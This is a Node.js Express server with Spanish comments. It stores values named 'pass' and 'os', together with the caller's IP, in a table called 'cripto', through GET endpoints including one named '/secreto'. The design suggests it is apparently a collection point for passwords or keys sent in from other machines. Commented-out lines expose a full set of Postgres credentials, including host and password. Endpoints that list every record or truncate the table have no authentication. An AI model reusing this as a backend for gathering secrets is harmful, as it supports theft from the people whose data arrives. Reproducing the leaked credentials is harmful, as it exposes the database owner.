const express = require('express');
const app = express();
const cors = require('cors');
const { response } = require('express');
const generateUniqueId = require('generate-unique-id');
const knex = require('knex')({
    client: 'pg',
    connection: {
//	    user:'fllmtgkemwbgdp',
//	    host:'ec2-50-17-255-120.compute-1.amazonaws.com',
//	    database:'d7lnp964sb3j1r',
//	    password:'4331177af89fd709b9c6a858a43f8264d3d5a768ccbab013958b2eea4ffd4e64',
//	    port:5432,
        connectionString: process.env.DATABASE_URL,
        ssl: {
          rejectUnauthorized: false
        }
    }
  });
  


// hola mundo

app.use(express.urlencoded({ extended: false }));
app.use(express.json());
app.use(cors());


//tipos de usuarios

app.post ('/agregar', (req, res) =>{
  console.log(req.body);
  console.log(req);
  const {ip, pass, so} = req.body;
  console.log(req.body);
  const id = generateUniqueId({
  length: 20,
  useLetters: false
});
  knex('cripto')
  .returning('*')
  .insert({
    id:id,
    ip:ip,
    pass:pass,
    so:so}).then(data => {
    res.json('listo');}).catch(err => console.log(err))
})
app.get('/datos', (req, res) =>{
    knex.select('*').from('cripto').then(data => {
        res.send(data)
        console.log(data)
    })
})
//borrar todos los datos.
app.post ('/borrartodos', (req, res)=>{
knex('cripto').truncate().then(data=>{
  res.json('listo');
}).catch(err => console.log(err))
})
app.get ('/obtener', (req,res)=> {
  console.log(req)
  console.log(req.query);
  console.log(req.headers['user-agent'].split(" "));
  const id = generateUniqueId({
    length: 20,
    useLetters: false
  });
    knex('cripto')
    .returning('*')
    .insert({
      id:id,
      ip:req.headers['x-forwarded-for'],
      pass:req.query.pass,
      so:req.query.os
    } ).then(data => {
      res.json('listo');}).catch(err => console.log(err))
  })
  app.get('/datos', (req, res) =>{
      knex.select('*').from('cripto').then(data => {
          res.send(data)
          console.log(data)
      })

})

//Borrar 1 elemento
app.post('/borrar', (req, res)=>{
  const {id} = req.body;
knex('cripto').where('id','=',id).del().then(
       res.json('hecho')
       
    ).catch(err => console.log(err))
})
app.get ('/secreto', (req,res)=> {
  console.log(req)
  console.log(req.query);
  const id = generateUniqueId({
    length: 20,
    useLetters: false
  });
    knex('cripto')
    .returning('*')
    .insert({
      id:id,
      ip:req.headers['x-forwarded-for'],
      pass:req.query.pass,
      so:req.query.os
    } )
  })


app.listen(process.env.PORT || 3001, () => {
    console.log('Funcionando');
});
//hola esto es un comentario
